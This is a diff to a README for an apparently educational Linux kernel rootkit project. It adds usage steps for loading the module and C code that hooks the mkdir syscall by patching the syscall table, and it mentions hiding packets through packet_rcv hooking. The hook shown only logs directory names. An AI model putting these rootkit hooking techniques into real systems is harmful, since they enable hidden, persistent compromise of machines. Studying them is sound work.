@@ -8,6 +8,13 @@
 Linux SniperX-D 5.8.0-48-generic #54~20.04.1-Ubuntu SMP Sat Mar 20 13:40:25 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
+to use the rootkit, run:
+```sh
+make
+
+insmod hooking_test_lkm.ko
+```
+
 ### example for hiding packets (hooking packet_rcv):
 
 a code sample from src/packet_hide.c:
@@ -38,11 +45,50 @@ int exit_packet_hide(void){
 	return 1;
 }
 ```
-to use the rootkit, run:
-```sh
-make
 
-insmod hooking_test_lkm.ko
-```
 ### live example:
 ![Live_example](live_example.gif)
+
+### example for hooking mkdir syscall (source: https://github.com/xcellerator/linux_kernel_hacking/blob/1ce0db23318d73a19e046a36da731e43c42faf41/3_RootkitTechniques/3.1_syscall_hooking/rootkit.c):
+
+a code sample from src/open_hook.c:
+```c
+#include "syscall_hooking.h"
+
+struct hooked_syscall nr_open;
+
+typedef asmlinkage long (*orig_mkdir_t)(const struct pt_regs *);
+orig_mkdir_t orig_mkdir;
+
+asmlinkage int hook_mkdir(const struct pt_regs *regs)
+{
+    char __user *pathname = (char *)regs->di;
+    char dir_name[NAME_MAX] = {0};
+
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    if (error > 0)
+        printk(KERN_INFO "rootkit: Trying to create directory with name: %s\n", dir_name);
+
+    orig_mkdir(regs);
+    return 0;
+}
+
+int init_open_hook (void){
+
+	nr_open.syscall = __NR_mkdir;
+	nr_open.fake_syscall = &hook_mkdir;
+
+	orig_mkdir = (orig_mkdir_t)hook_syscall(&nr_open);
+	return 1;
+}
+
+int exit_open_hook (void){
+
+	reset_syscall(&nr_open);
+	return 1;
+}
+```
+
+### live example:
+![Live_example](live_example2.gif)
